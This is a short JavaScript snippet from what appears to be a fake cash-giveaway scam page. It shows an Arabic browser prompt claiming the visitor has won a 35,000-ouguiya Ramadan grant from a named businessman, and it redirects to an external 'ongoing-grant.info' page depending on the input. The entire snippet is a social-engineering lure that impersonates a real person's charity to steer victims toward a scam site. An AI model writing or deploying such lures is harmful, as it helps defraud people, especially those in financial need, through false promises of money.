var password = 'سحب الأموال';

password = prompt(
  'تهانينا، أنت مؤهل للحصول على دعم محمد بوعماتو الرمضاني النقدي بقيمة 35,000 أوقية. اضغط على موافق للاستلام فورًا.',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.info/Boua-Matou-Um35,000.html';
}
